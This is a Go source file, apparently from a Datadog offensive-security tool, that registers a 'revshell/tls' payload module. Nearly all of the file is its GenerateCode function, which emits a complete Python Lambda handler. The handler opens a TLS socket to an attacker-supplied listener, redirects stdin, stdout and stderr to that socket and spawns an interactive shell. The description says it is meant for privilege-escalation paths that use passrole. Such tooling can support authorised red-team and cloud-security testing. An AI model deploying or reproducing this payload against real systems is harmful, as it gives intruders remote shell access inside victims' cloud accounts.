// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package lambda

import (
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

type RevshellTLSPayload struct{}

func init() {
	payloads.Register(&RevshellTLSPayload{})
}

func (p *RevshellTLSPayload) GetName() string {
	return "revshell/tls"
}

func (p *RevshellTLSPayload) GetDescription() string {
	return "Establish a TLS-encrypted reverse shell from inside a Lambda function. Only works with new-passrole modules where the function timeout can be set to 900s"
}

func (p *RevshellTLSPayload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguagePython,
		payloads.TagTechniqueAccess,
		payloads.TagTransportHTTPS,
	}
}

func (p *RevshellTLSPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "LISTENER_IP",
			Description: "Attacker listener host (IP or hostname)",
			Required:    true,
		},
		{
			Name:        "LISTENER_PORT",
			Description: "Port for reverse shell connection",
			Required:    false,
			Default:     "4444",
		},
		{
			Name:        "SHELL",
			Description: "Shell binary to execute",
			Required:    false,
			Default:     "/bin/sh",
		},
	}
}

func (p *RevshellTLSPayload) Validate(options map[string]string) error {
	if options["LISTENER_IP"] == "" {
		return fmt.Errorf("LISTENER_IP is required for revshell/tls payload")
	}
	if strings.Contains(options["LISTENER_IP"], "'") || strings.Contains(options["LISTENER_PORT"], "'") {
		return fmt.Errorf("LISTENER_IP and LISTENER_PORT must not contain single quotes")
	}
	return nil
}

func (p *RevshellTLSPayload) GenerateCode(options map[string]string) (string, error) {
	code := `import socket
import ssl
import subprocess
import os

def lambda_handler(event, context):
    lhost = os.environ.get('LISTENER_IP', '')
    lport = int(os.environ.get('LISTENER_PORT', '4444'))
    shell = os.environ.get('SHELL', '/bin/sh')

    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_sock.settimeout(30)
        sock = ctx.wrap_socket(raw_sock, server_hostname=lhost)
        sock.connect((lhost, lport))
        sock.settimeout(None)

        os.dup2(sock.fileno(), 0)
        os.dup2(sock.fileno(), 1)
        os.dup2(sock.fileno(), 2)

        subprocess.call([shell, '-i'])

    except Exception as e:
        return {
            'statusCode': 500,
            'body': f'Reverse shell failed: {str(e)}'
        }

    return {
        'statusCode': 200,
        'body': 'Reverse shell session ended'
    }
`

	return code, nil
}

func (p *RevshellTLSPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
